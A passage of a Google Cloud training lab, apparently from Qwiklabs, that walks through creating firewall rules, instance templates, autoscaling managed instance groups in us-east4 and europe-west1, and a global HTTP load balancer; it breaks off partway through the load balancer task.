list</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Click </span><strong><span>Authorize</span></strong><span>.</span></p></li></ol><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ACTIVE: *</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ACCOUNT: student-02-228103688975@qwiklabs.net</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">To set the active account, run:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  $ gcloud config set account `ACCOUNT`</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 113px;"></div><div class="CodeMirror-gutters" style="display: none; height: 113px;"></div></div></div></pre><ol start='' ><li><p><span>(Optional) You can list the project ID with this command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud config list project</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[core]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">project = qwiklabs-gcp-03-7acbbdef9b9d</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><strong><span>Note:</span></strong><span> For full documentation of </span><code>gcloud</code><span>, in Google Cloud, refer to </span><a href='https://cloud.google.com/sdk/gcloud'><span>the gcloud CLI overview guide</span></a><span>.</span></p><h3 id='task-1-configure-http-and-health-check-firewall-rules'><span>Task 1. Configure HTTP and health check firewall rules</span></h3><p><span>Configure firewall rules to allow HTTP traffic to the backends and TCP traffic from the Google Cloud health checker.</span></p><h4 id='create-the-http-firewall-rule'><strong><span>Create the HTTP firewall rule</span></strong></h4><p><span>Create a firewall rule to allow HTTP traffic to the backends.</span></p><ol start='' ><li><p><span>In the Cloud Console, navigate to </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>) &gt; </span><strong><span>VPC network</span></strong><span> &gt; </span><strong><span>Firewall</span></strong><span>.</span></p></li><li><p><span>Notice the existing </span><strong><span>ICMP</span></strong><span>, </span><strong><span>internal</span></strong><span>, </span><strong><span>RDP</span></strong><span>, and </span><strong><span>SSH</span></strong><span> firewall rules.</span></p><p><span>Each Google Cloud project starts with the </span><strong><span>default</span></strong><span> network and these firewall rules.</span></p></li><li><p><span>Click </span><strong><span>Create Firewall Rule</span></strong><span>.</span></p></li><li><p><span>Set the following values, leave all other values at their defaults:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (type value or select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Name</span></td><td style='text-align:left;' ><span>default-allow-http</span></td></tr><tr><td style='text-align:left;' ><span>Network</span></td><td style='text-align:left;' ><span>default</span></td></tr><tr><td style='text-align:left;' ><span>Targets</span></td><td style='text-align:left;' ><span>Specified target tags</span></td></tr><tr><td style='text-align:left;' ><span>Target tags</span></td><td style='text-align:left;' ><span>http-server</span></td></tr><tr><td style='text-align:left;' ><span>Source filter</span></td><td style='text-align:left;' ><span>IPv4 Ranges</span></td></tr><tr><td style='text-align:left;' ><span>Source IP ranges</span></td><td style='text-align:left;' ><span>0.0.0.0/0</span></td></tr><tr><td style='text-align:left;' ><span>Protocols and ports</span></td><td style='text-align:left;' ><span>Specified protocols and ports, and then </span><em><span>check</span></em><span> tcp, </span><em><span>type:</span></em><span> 80</span></td></tr></tbody></table></figure><p><strong><span>Note:</span></strong><span> Make sure to include the </span><strong><span>/0</span></strong><span> in the </span><strong><span>Source IP ranges</span></strong><span> to specify all networks.</span></p></li><li><p><span>Click </span><strong><span>Create</span></strong><span>.</span></p></li></ol><h4 id='create-the-health-check-firewall-rules'><strong><span>Create the health check firewall rules</span></strong></h4><p><span>Health checks determine which instances of a load balancer can receive new connections. For HTTP load balancing, the health check probes to your load balanced instances come from addresses in the ranges </span><code>130.211.0.0/22</code><span> and </span><code>35.191.0.0/16</code><span>. Your firewall rules must allow these connections.</span></p><ol start='' ><li><p><span>Still in the </span><strong><span>Firewall rules</span></strong><span> page, click </span><strong><span>Create Firewall Rule</span></strong><span>.</span></p></li><li><p><span>Set the following values, leave all other values at their defaults:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (type value or select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Name</span></td><td style='text-align:left;' ><span>default-allow-health-check</span></td></tr><tr><td style='text-align:left;' ><span>Network</span></td><td style='text-align:left;' ><span>default</span></td></tr><tr><td style='text-align:left;' ><span>Targets</span></td><td style='text-align:left;' ><span>Specified target tags</span></td></tr><tr><td style='text-align:left;' ><span>Target tags</span></td><td style='text-align:left;' ><span>http-server</span></td></tr><tr><td style='text-align:left;' ><span>Source filter</span></td><td style='text-align:left;' ><span>IPv4 Ranges</span></td></tr><tr><td style='text-align:left;' ><span>Source IP ranges</span></td><td style='text-align:left;' ><code>130.211.0.0/22</code><span>, </span><code>35.191.0.0/16</code></td></tr><tr><td style='text-align:left;' ><span>Protocols and ports</span></td><td style='text-align:left;' ><span>Specified protocols and ports, and then </span><em><span>check</span></em><span> tcp</span></td></tr></tbody></table></figure><p><strong><span>Note:</span></strong><span> Make sure to enter the two </span><strong><span>Source IP ranges</span></strong><span> one-by-one and press SPACE in between them.</span></p></li><li><p><span>Click </span><strong><span>Create</span></strong><span>.</span></p></li></ol><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify the objective.</span></p><p><span>Configure HTTP and health check firewall rules</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h3 id='task-2-configure-instance-templates-and-create-instance-groups'><span>Task 2. Configure instance templates and create instance groups</span></h3><p><span>A managed instance group uses an instance template to create a group of identical instances. Use these to create the backends of the HTTP Load Balancer.</span></p><h4 id='configure-the-instance-templates-2'><span>Configure the instance templates</span></h4><p><span>An instance template is an API resource that you use to create VM instances and managed instance groups. Instance templates define the machine type, boot disk image, subnet, labels, and other instance properties. Create one instance template for </span><strong><code>us-east4</code></strong><span> and one for </span><strong><code>europe-west1</code></strong><span>.</span></p><ol start='' ><li><p><span>In the Cloud Console, navigate to </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>) &gt; </span><strong><span>Compute Engine</span></strong><span> &gt; </span><strong><span>Instance templates</span></strong><span>, and then click </span><strong><span>Create instance template</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Name</span></strong><span>, type </span><strong><code>us-east4</code><span>-template</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Location</span></strong><span>, Select </span><strong><span>Global</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Series</span></strong><span>, select </span><strong><span>E2</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Networking, disks, security, management, sole-tenancy</span></strong><span>.</span></p></li></ol><p><img src="images\yugx7DIYL4xTkUrJUKrUidZyGVIU4nqNc2%2BeurZRrbg%3D" referrerpolicy="no-referrer" alt="Identity and API access page"></p><ol start='' ><li><p><span>Click the </span><strong><span>Management</span></strong><span> tab.</span></p></li></ol><p><img src="images\pYVGB%2FFz65FDcnP2J2bZG%2FnoIkAHpTaNwvNm2KkKYRQ%3D" referrerpolicy="no-referrer" alt="Management tab"></p><ol start='' ><li><p><span>Under </span><strong><span>Metadata</span></strong><span>, click </span><strong><span>+ADD ITEM</span></strong><span> specify the following:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Key</span></th><th style='text-align:left;' ><span>Value</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>startup-script-url</span></td><td style='text-align:left;' ><span>gs://cloud-training/gcpnet/httplb/startup.sh</span></td></tr></tbody></table></figure></li></ol><p><strong><span>Note:</span></strong><span> The </span><code>startup-script-url</code><span> specifies a script that executes when instances are started. This script installs Apache and changes the welcome page to include the client IP and the name, region, and zone of the VM instance. Feel free to explore </span><a href='https://storage.googleapis.com/cloud-training/gcpnet/httplb/startup.sh'><span>this script</span></a><span>.</span></p><ol start='' ><li><p><span>Click </span><strong><span>Networking</span></strong><span>, for </span><strong><span>Network tags</span></strong><span>, type </span><code>http-server</code><span>.</span></p></li><li><p><span>For </span><strong><span>Network interfaces</span></strong><span> expand default network and set the following values.</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (type value or select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Network</span></td><td style='text-align:left;' ><span>default</span></td></tr><tr><td style='text-align:left;' ><span>Subnet</span></td><td style='text-align:left;' ><span>default (</span><code>us-east4</code><span>)</span></td></tr></tbody></table></figure></li></ol><p><strong><span>Note:</span></strong><span> The network tag </span><strong><span>http-server</span></strong><span> ensures that the </span><strong><span>HTTP</span></strong><span> and </span><strong><span>Health Check</span></strong><span> firewall rules apply to these instances.</span></p><ol start='' ><li><p><span>Click </span><strong><span>Create</span></strong><span>.</span></p></li><li><p><span>Wait for the instance template to be created.</span></p></li></ol><p><span>Now create another instance template for </span><strong><span>subnet-b</span></strong><span> by copying </span><strong><code>us-east4</code><span>-template</span></strong><span>:</span></p><ol start='' ><li><p><span>Click on </span><strong><code>us-east4</code><span>-template</span></strong><span> and then click on the </span><strong><span>CREATE SIMILAR</span></strong><span> option from the top.</span></p></li><li><p><span>For </span><strong><span>Name</span></strong><span>, type </span><strong><code>europe-west1</code><span>-template</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Location</span></strong><span>, Select </span><strong><span>Global</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Networking, disks, security, management, sole-tenancy</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Networking</span></strong><span>, expand </span><code>default</code><span> network.</span></p></li><li><p><span>For </span><strong><span>Subnet</span></strong><span>, select </span><strong><span>default (</span><code>europe-west1</code><span>)</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Create</span></strong><span>.</span></p></li></ol><h4 id='create-the-managed-instance-groups'><span>Create the managed instance groups</span></h4><p><span>Create a managed instance group in </span><strong><code>us-east4</code></strong><span> and one in </span><strong><code>europe-west1</code></strong><span>.</span></p><ol start='' ><li><p><span>In the </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>) click </span><strong><span>Compute Engine &gt; Instance groups</span></strong><span> in the left menu.</span></p></li><li><p><span>Click </span><strong><span>Create instance group</span></strong><span>.</span></p></li><li><p><span>Set the following values, leave all other values at their defaults:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (type value or select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Name</span></td><td style='text-align:left;' ><code>us-east4</code><span>-mig</span></td></tr><tr><td style='text-align:left;' ><span>Location</span></td><td style='text-align:left;' ><span>Multiple zones</span></td></tr><tr><td style='text-align:left;' ><span>Region</span></td><td style='text-align:left;' ><code>us-east4</code></td></tr><tr><td style='text-align:left;' ><span>Instance template</span></td><td style='text-align:left;' ><code>us-east4</code><span>-template</span></td></tr><tr><td style='text-align:left;' ><span>Autoscaling &gt; Autoscaling signals (click the dropdown icon to edit) &gt; Signal type</span></td><td style='text-align:left;' ><span>CPU utilization</span></td></tr><tr><td style='text-align:left;' ><span>Target CPU utilization</span></td><td style='text-align:left;' ><span>80, click </span><strong><span>Done</span></strong><span>.</span></td></tr><tr><td style='text-align:left;' ><span>Initialization period</span></td><td style='text-align:left;' ><span>45</span></td></tr><tr><td style='text-align:left;' ><span>Minimum number of instances</span></td><td style='text-align:left;' ><span>1</span></td></tr><tr><td style='text-align:left;' ><span>Maximum number of instances</span></td><td style='text-align:left;' ><span>5</span></td></tr></tbody></table></figure><p><strong><span>Note:</span></strong><span> Managed instance groups offer </span><strong><span>autoscaling</span></strong><span> capabilities that allow you to automatically add or remove instances from a managed instance group based on increases or decreases in load. Autoscaling helps your applications gracefully handle increases in traffic and reduces cost when the need for resources is lower. You just define the autoscaling policy and the autoscaler performs automatic scaling based on the measured load.</span></p></li><li><p><span>Click </span><strong><span>Create</span></strong><span>.</span></p></li></ol><p><span>Now repeat the same procedure for create a second instance group for </span><strong><code>europe-west1</code><span>-mig</span></strong><span> in </span><strong><code>europe-west1</code></strong><span>:</span></p><ol start='' ><li><p><span>Click </span><strong><span>Create Instance group</span></strong><span>.</span></p></li><li><p><span>Set the following values, leave all other values at their defaults:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (type value or select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Name</span></td><td style='text-align:left;' ><code>europe-west1</code><span>-mig</span></td></tr><tr><td style='text-align:left;' ><span>Location</span></td><td style='text-align:left;' ><span>Multiple zones</span></td></tr><tr><td style='text-align:left;' ><span>Region</span></td><td style='text-align:left;' ><code>europe-west1</code></td></tr><tr><td style='text-align:left;' ><span>Instance template</span></td><td style='text-align:left;' ><code>europe-west1</code><span>-template</span></td></tr><tr><td style='text-align:left;' ><span>Autoscaling &gt; Autoscaling signals (click the dropdown icon to edit) &gt; Signal type</span></td><td style='text-align:left;' ><span>CPU utilization</span></td></tr><tr><td style='text-align:left;' ><span>Target CPU utilization</span></td><td style='text-align:left;' ><span>80, click </span><strong><span>Done</span></strong><span>.</span></td></tr><tr><td style='text-align:left;' ><span>Initialization period</span></td><td style='text-align:left;' ><span>45</span></td></tr><tr><td style='text-align:left;' ><span>Minimum number of instances</span></td><td style='text-align:left;' ><span>1</span></td></tr><tr><td style='text-align:left;' ><span>Maximum number of instances</span></td><td style='text-align:left;' ><span>5</span></td></tr></tbody></table></figure></li><li><p><span>Click </span><strong><span>Create</span></strong><span>.</span></p></li></ol><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify the objective.</span></p><p><span>Configure instance templates and instance group</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h4 id='verify-the-backends-2'><span>Verify the backends</span></h4><p><span>Verify that VM instances are being created in both regions and access their HTTP sites.</span></p><ol start='' ><li><p><span>Still in </span><strong><span>Compute Engine</span></strong><span>, click </span><strong><span>VM instances</span></strong><span> in the left menu.</span></p></li><li><p><span>Notice the instances that start with </span><code>us-east4-mig</code><span> and </span><code>europe-west1-mig</code><span>.</span></p><p><span>These instances are part of the managed instance groups.</span></p></li><li><p><span>Click on the </span><strong><span>External IP</span></strong><span> of an instance of </span><code>us-east4-mig</code><span>.</span></p><p><span>You should see the </span><strong><span>Client IP</span></strong><span> (your IP address), the </span><strong><span>Hostname</span></strong><span> (starts with </span><code>us-east4-mig</code><span>) and the </span><strong><span>Server Location</span></strong><span> (a zone in </span><code>us-east4</code><span>).</span></p></li><li><p><span>Click on the </span><strong><span>External IP</span></strong><span> of an instance of </span><code>europe-west1-mig</code><span>.</span></p><p><span>You should see the </span><strong><span>Client IP</span></strong><span> (your IP address), the </span><strong><span>Hostname</span></strong><span> (starts with </span><code>europe-west1-mig</code><span>) and the </span><strong><span>Server Location</span></strong><span> (a zone in </span><code>europe-west1</code><span>).</span></p></li></ol><p><strong><span>Note:</span></strong><span> The </span><strong><span>Hostname</span></strong><span> and </span><strong><span>Server Location</span></strong><span> identifies where the HTTP Load Balancer sends traffic.</span></p><p>&nbsp;</p><p><span>Which of these fields identify the region of the backend?</span></p><p>&nbsp;</p><p><span>Hostname</span></p><p>&nbsp;</p><p><span>Server Location</span></p><p>&nbsp;</p><p><span>Client IP</span></p><p>&nbsp;</p><p><span>Submit</span></p><p>&nbsp;</p><h3 id='task-3-configure-the-http-load-balancer-2'><span>Task 3. Configure the HTTP Load Balancer</span></h3><p><span>Configure the HTTP Load Balancer to balance traffic between the two backends (</span><strong><code>us-east4</code><span>-mig</span></strong><span> in </span><code>us-east4</code><span> and </span><strong><code>europe-west1</code><span>-mig</span></strong><span> in </span><code>europe-west1</code><span>), as illustrated in the network diagram:</span></p><p><img src="images\7wJtCqbfTFLwKCpOMzUSyPjVKBjUouWHbduOqMpfRiM%3D" referrerpolicy="no-referrer" alt="Network diagram"></p><h4 id='start-the-configuration-3'><span>Start the configuration</span></h4><ol start='' ><li><p><span>In the Cloud Console, click </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>) &gt; click </span><strong><span>Network Services</span></strong><span> &gt; </span><strong><span>Load balancing</span></strong><span>, and then click </span><strong><span>Create load balancer</span></strong><span>.</span></p></li><li><p><span>Under </span><strong><span>Application Load Balancer (HTTP/S)</span></strong><span>, click </span><strong><span>Next</span></strong><span>.</span></p></li><li><p><span>Under </span><strong><span>Under Public facing or internal only</span></strong><span>, select </span><strong><span>Public facing (external)</span></strong><span>, click </span><strong><span>Next</span></strong><span>.</span></p></li><li><p><span>Under </span><strong><span>Global or single region deployment</span></strong><span>, select </span><strong><span>Best for global workloads</span></strong><span>, click </span><strong><span>Next</span></strong><span>.</span></p></li><li><p><span>Under </span><strong><span>Load balancer generation</span></strong><span>, select </span><strong><span>Global external Application Load Balancer</span></strong><span>, click </span><strong><span>Next</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Configure</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Load Balancer Name</span></strong><span>, type </span><strong><span>http-lb</span></strong><span>.</span></p></li></ol><h4 id='configure-the-backend-2'><span>Configure the backend</span></h4><p><span>Backend services direct incoming traffic to one or more attached backends. Each backend is composed of an instance group and additional serving capacity metadata.</span></p><ol start='' ><li><p><span>Click on </span><strong><span>Backend configuration</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Backend services &amp; backend buckets</span></strong><span> dropdown, click </span><strong><span>Create a backend service</span></strong><span>.</span></p></li><li><p><span>Set the following values, leave all other values at their defaults:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Name</span></td><td style='text-align:left;' ><span>http-backend</span></td></tr><tr><td style='text-align:left;' ><span>Instance group</span></td><td style='text-align:left;' ><code>us-east4</code><span>-mig</span></td></tr><tr><td style='text-align:left;' ><span>Port numbers</span></td><td style='text-align:left;' ><span>80</span></td></tr><tr><td style='text-align:left;' ><span>Balancing mode</span></td><td style='text-align:left;' ><span>Rate</span></td></tr><tr><td style='text-align:left;' ><span>Maximum RPS</span></td><td style='text-align:left;' ><span>50</span></td></tr><tr><td style='text-align:left;' ><span>Capacity</span></td><td style='text-align:left;' ><span>100</span></td></tr></tbody></table></figure><p><strong><span>Note:</span></strong><span> This configuration means that the load balancer attempts to keep each instance of </span><strong><code>us-east4</code><span>-mig</span></strong><span> at or below 50 requests per second (RPS).</span></p></li><li><p><span>Click </span><strong><span>Done</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Add a backend</span></strong><span>.</span></p></li><li><p><span>Set the following values, leave all other values at their defaults:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Instance group</span></td><td style='text-align:left;' ><code>europe-west1</code><span>-mig</span></td></tr><tr><td style='text-align:left;' ><span>Port numbers</span></td><td style='text-align:left;' ><span>80</span></td></tr><tr><td style='text-align:left;' ><span>Balancing mode</span></td><td style='text-align:left;' ><span>Utilization</span></td></tr><tr><td style='text-align:left;' ><span>Maximum backend utilization</span></td><td style='text-align:left;' ><span>80</span></td></tr><tr><td style='text-align:left;' ><span>Capacity</span></td><td style='text-align:left;' ><span>100</span></td></tr></tbody></table></figure><p><strong><span>Note:</span></strong><span> This configuration means that the load balancer attempts to keep each instance of </span><strong><code>europe-west1</code><span>-mig</span></strong><span> at or below 80% CPU utilization.</span></p></li><li><p><span>Click </span><strong><span>Done</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Health Check</span></strong><span>, select </span><strong><span>Create a health check</span></strong><span>.</span></p></li><li><p><span>Set the following values, leave all other values at their defaults:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Name</span></td><td style='text-align:left;' ><span>http-health-check</span></td></tr><tr><td style='text-align:left;' ><span>Protocol</span></td><td style='text-align:left;' ><span>TCP</span></td></tr><tr><td style='text-align:left;' ><span>Port</span></td><td style='text-align:left;' ><span>80</span></td></tr></tbody></table></figure><p><strong><span>Note:</span></strong><span> Health checks determine which instances receive new connections. This HTTP health check polls instances every 5 seconds, waits up to 5 seconds for a response and treats 2 successful or 2 failed attempts as healthy or unhealthy, respectively.</span></p></li><li><p><span>Click </span><strong><span>Save</span></strong><span>.</span></p></li><li><p><span>Check the </span><strong><span>Enable Logging</span></strong><span> box.</span></p></li><li><p><span>Set the </span><strong><span>Sample Rate</span></strong><span> to </span><code>1</code><span>:</span></p></li><li><p><span>Click </span><strong><span>Create</span></strong><span> to create the backend service, click </span><strong><span>OK</span></strong><span>.</span></p></li></ol><h4 id='configure-the-frontend-3'><span>Configure the frontend</span></h4><p><span>The host and path rules determine how your traffic will be directed. For example, you could direct video traffic to one backend and static traffic to another backend. However, you are not configuring the Host and path rules in this lab.</span></p><ol start='' ><li><p><span>Click on </span><strong><span>Frontend configuration</span></strong><span>.</span></p></li><li><p><span>Specify the following, leaving all other values at their defaults:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (type value or select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Protocol</span></td><td style='text-align:left;' ><span>HTTP</span></td></tr><tr><td style='text-align:left;' ><span>IP version</span></td><td style='text-align:left;' ><span>IPv4</span></td></tr><tr><td style='text-align:left;' ><span>IP address</span></td><td style='text-align:left;' ><span>Ephemeral</span></td></tr><tr><td style='text-align:left;' ><span>Port</span></td><td style='text-align:left;' ><span>80</span></td></tr></tbody></table></figure></li><li><p><span>Click </span><strong><span>Done</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Add Frontend IP and port</span></strong><span>.</span></p></li><li><p><span>Specify the following, leaving all other values at their defaults:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (type value or select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Protocol</span></td><td style='text-align:left;' ><span>HTTP</span></td></tr><tr><td style='text-align:left;' ><span>IP version</span></td><td style='text-align:left;' ><span>IPv6</span></td></tr><tr><td style='text-align:left;' ><span>IP address</span></td><td style='text-align:left;' ><span>Auto-allocate</span></td></tr><tr><td style='text-align:left;' ><span>Port</span></td><td style='text-align:left;' ><span>80</span></td></tr></tbody></table></figure></li><li><p><span>Click </span><strong><span>Done</span></strong><span>.</span></p></li></ol><p><strong><span>Note:</span></strong><span> HTTP(S) load balancing supports both IPv4 and IPv6 addresses for client traffic. Client IPv6 requests are terminated at the global load balancing layer, then proxied over IPv4 to your backends.</span></p><h4 id='review-and-create-the-http-load-balancer-3'><span>Review and create the HTTP Load Balancer</span></h4><ol start='' ><li><p><span>Click </span><strong><span>Review and finalize</span></strong><span>.</span></p><p><img src="images\IBhiqd5LWxFUFCPGyXQpotAd4KwchPVrm2pRPzOHJyA%3D" referrerpolicy="no-referrer" alt="Review and finalize option"></p></li><li><p><span>Review the </span><strong><span>Backend services</span></strong><span> and </span><strong><span>Frontend</span></strong><span>.</span></p><p><img src="images\8WLBOukmVzs8XkDjjHBroztYRDVekN2JTS4s%2BuHQk5o%3D" referrerpolicy="no-referrer" alt="Frontend and Backend sections"></p></li><li><p><span>Click </span><strong><span>Create</span></strong><span>.</span></p></li><li><p><span>Wait for the load balancer to be created.</span></p></li><li><p><span>Click on the name of the load balancer (</span><strong><span>http-lb</span></strong><span>).</span></p></li><li><p><span>Note the IPv4 and IPv6 addresses of the load balancer for the next task. They will be referred to as </span><code>[LB_IP_v4]</code><span> and </span><code>[LB_IP_v6]</code><span>, respectively.</span></p></li></ol><p><strong><span>Note:</span></strong><span> The IPv6 address is the one in hexadecimal format.</span></p><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify the objective.</span></p><p><span>Configure the HTTP Load 